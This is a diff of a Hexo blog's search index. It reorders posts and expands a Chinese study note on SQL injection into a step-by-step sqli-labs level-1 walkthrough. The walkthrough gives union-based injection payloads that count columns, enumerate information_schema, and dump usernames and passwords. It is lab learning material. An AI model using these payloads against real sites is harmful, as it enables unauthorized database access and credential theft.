@@ -1,23 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Diary_1106</title>
-    <url>/2022/11/06/Diary_1106/</url>
-    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_3.png" alt="凉宫春日"></p>
-<span id="more"></span>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末转瞬即逝，新的一天再次来临</p>
-<h1 id="简单记录"><a href="#简单记录" class="headerlink" title="简单记录"></a>简单记录</h1><ol>
-<li>早上起来感觉感冒了，竟然中招了，真糟。及时止损，估计是被窝不够暖和。</li>
-<li>上午9点体测，跳远和引体向上。排队等了一个小时。</li>
-<li>python爬虫基本算是学完了，下午自己做了一个爬虫把某人博客的内容给爬取出来了，基本没有反爬措施，比较简单。只是我不大熟练，弄了好几小时。</li>
-<li>晚上安装sqli-labs靶场，不知哪儿出了问题，本该十分钟内解决的问题折腾了三小时，最终重装phpstudy_pro就没问题了。所谓重装解决一切困难呢。 </li>
-<li>本想直接做靶场的练习，但不曾想连答案解析都看不懂，还是得听听网课看看文章之类的吧。</li>
-</ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>有花堪折直须折，莫待无花空折枝</strong></p>
-]]></content>
-  </entry>
-  <entry>
     <title>锦瑟</title>
     <url>/2022/11/05/Diary_1105/</url>
     <content><![CDATA[<p><img src="/images/Holo.png" alt="Holo"></p>
@@ -49,6 +32,23 @@
       </tags>
   </entry>
   <entry>
+    <title>Diary_1106</title>
+    <url>/2022/11/06/Diary_1106/</url>
+    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_3.png" alt="凉宫春日"></p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末转瞬即逝，新的一天再次来临</p>
+<h1 id="简单记录"><a href="#简单记录" class="headerlink" title="简单记录"></a>简单记录</h1><ol>
+<li>早上起来感觉感冒了，竟然中招了，真糟。及时止损，估计是被窝不够暖和。</li>
+<li>上午9点体测，跳远和引体向上。排队等了一个小时。</li>
+<li>python爬虫基本算是学完了，下午自己做了一个爬虫把某人博客的内容给爬取出来了，基本没有反爬措施，比较简单。只是我不大熟练，弄了好几小时。</li>
+<li>晚上安装sqli-labs靶场，不知哪儿出了问题，本该十分钟内解决的问题折腾了三小时，最终重装phpstudy_pro就没问题了。所谓重装解决一切困难呢。 </li>
+<li>本想直接做靶场的练习，但不曾想连答案解析都看不懂，还是得听听网课看看文章之类的吧。</li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>有花堪折直须折，莫待无花空折枝</strong></p>
+]]></content>
+  </entry>
+  <entry>
     <title>SQL注入之字符型和数字型判断</title>
     <url>/2022/11/07/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习SQL注入，应当对SQL语句较为熟悉，否则会比较懵。</p>
@@ -74,15 +74,16 @@
 <p>多余的单引号不匹配，因此返回错误</p>
 </li>
 </ol>
-<p>字符型可以通过闭合多余的单引号，使用注释符#或–+</p>
+<p>字符型可以通过闭合多余的单引号，使用注释符#或--+</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span><span class="comment">--+&#x27;</span></span><br></pre></td></tr></table></figure>
 <p>最后的引号被注释掉，实际运行效果是id&#x3D;’1’<br>因此返回正常</p>
 <h1 id="字符型和数字型"><a href="#字符型和数字型" class="headerlink" title="字符型和数字型"></a>字符型和数字型</h1><p>通过以上分析，我们可以得出结论：</p>
 <ul>
 <li>当$id&#x3D;1 and 1&#x3D;2 时，<br>数字型返回错误，而字符型返回正常</li>
 <li>当$id&#x3D;1’ 时，<br>二者均返回错误</li>
-<li>当$id&#x3D;1’–+ 时，<br>数字型返回错误，而字符型返回正常</li>
+<li>当$id&#x3D;1’--+ 时，<br>数字型返回错误，而字符型返回正常</li>
 </ul>
+<p>注：or可以构造一个一直为true的语句，能返回正常</p>
 <h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_44798520/article/details/122453649">sql注入_字符型、数字型判断</a></p>
 ]]></content>
       <categories>
@@ -144,44 +145,68 @@
 <span id="more"></span>
 
 <h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入任意内容后是否有<strong>报错提示</strong></li>
+<li>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’ (或任意内容)后是否有<strong>报错提示</strong></li>
 </ol>
 <ul>
 <li>有提示。则存在SQL注入</li>
 <li>无提示。不存在SQL注入<br>（说明：有提示即代表输入的数据带入到了数据库中查询，因此存在注入）<br>只有存在SQL注入才能继续往下执行。</li>
 </ul>
 <ol start="2">
-<li>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>未完待续…</li>
+<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>方法是：<br>首先输入：<br> ?id&#x3D;1 and 1&#x3D;2  或  ?id&#x3D;1’–+<br>由于之前我们已经输入过 ?id&#x3D;1’ 出现报错，<br>如果本次输入再次出现报错，说明是 数字型<br>否则即为 字符型</p>
+</li>
+<li><p>猜解SQL查询语句中的<strong>字段数</strong><br>为什么要猜解字段数？<br>因为我们已知存在SQL注入且其类型，可以使用联合查询注入。要使用联合注入首先得知道字段数。<br>（说明：联合查询Union:是把2个sql语句一起查询结果合并，且两张表需要有相同的列数和字段名，使用方式示例如下：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> A <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> B</span><br></pre></td></tr></table></figure>
+<p>）<br>字段数可以通过order by语句得知。原理是通过order by语句查询，显示正常时是查询列数小于等于总列数。如果报错则该查询列数超过总列数。由此可得知字段数。示例语句如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;order by 3--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆出显示位<br>所谓爆出显示位，意思是查看分析哪些列是在页面显示的，这有利于我们后续的分析操作。<br>因此我们可以通过如下语句查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+<p>（说明：id&#x3D;-1的原因是为了让查询结果完全是union右边的值）</p>
+</li>
+<li><p>获取当前数据库名和数据库版本号<br>获取数据库名可以执行一些后续操作，获取版本号可以判断哪些数据库操作能做哪些不能做。<br><a href="https://blog.csdn.net/weixin_34678198/article/details/113273999">MYSQL版本简单区别</a><br>因此我们可以通过如下语句查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br></pre></td></tr></table></figure>
+<p>这里用到了mysql的系统函数，下面列举5个常用mysql注入系统函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version()   		  MySQL版本</span><br><span class="line">user()     			  数据库用户名</span><br><span class="line">database() 			  数据库名</span><br><span class="line">@@datadir  			  数据库路径</span><br><span class="line">@@version_compile_os  操作系统版本</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆表<br>首先需要介绍数据库默认库information_schema中的重要表</p>
+</li>
 </ol>
+<ul>
+<li><p>information_schema.schemata<br>schemata表中重要字段为schema_name，此字段涵盖数据库存在的所有库名字，我们可以通过查询语句得知我们想要的数据库都有哪些（database()只可得知当前数据库）<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema,schemata</span><br></pre></td></tr></table></figure>
+<p>（说明：group_concat()的作用是将所有结果连接显示成一行）</p>
+</li>
+<li><p>information_schema.tables<br>tables表中重要字段为table_schema（库名）和table_name（表名）。可通过查询语句得到库名或表名，但由于table_schema与表字段table_name一一对应，有大量重复内容。只爆库建议使用schemata库查询<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_schema),group_concat(table_name) from information_schema.tables--+</span><br></pre></td></tr></table></figure>
+<p>通过此方法可单独爆出某个数据库内的表名，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema like 0x646F75706870--+</span><br></pre></td></tr></table></figure>
+<p>说明：通过匹配库爆表，需要将库名转换成哈希值或二进制，否则有时候会被转义从而报错</p>
+</li>
+<li><p>information_schema.columns<br>columns表中存在三个重要字段，分别为table_schema（库名字段）、table_name（表名字段）、column_name（字段）<br>可以直接利用这个表对数据库进行爆库爆表操作，只是仍然有很多重复字段，并不建议这么做。</p>
+</li>
+</ul>
+<p>在本关中具体语句即为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li><p>爆字段名<br>通过sql语句查询知道当前数据库有4个表，根据表名知道可能用户的账号和密码是在users表中。因此接下来即为得到该表的字段名和内容。<br>示例语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
+<p>说明：该语句查询information_schema数据库下的columns表的table_name字段。注意table_name字段在tables表和columns表中均存在。表示所有字段对应的表名。</p>
+</li>
+<li><p>爆数据<br>通过上述操作可知敏感字段username和password，接下来即查询该字段对应的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(username,id,password) from users--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
+<p><a href="https://blog.csdn.net/weixin_48421613/article/details/107488560">关于sql注入暴库爆表爆字段</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
         <category>sqli-labs</category>
       </categories>
       <tags>
-        <tag>SQL</tag>
+        <tag>SQL注入</tag>
         <tag>sqli-labs</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2022/11/03/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<span id="more"></span>
-
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
   </entry>
   <entry>
     <title>如何寻觅动画</title>
@@ -295,5 +320,25 @@
         <tag>动画</tag>
         <tag>资源</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2022/11/03/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<span id="more"></span>
+
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
   </entry>
 </search>
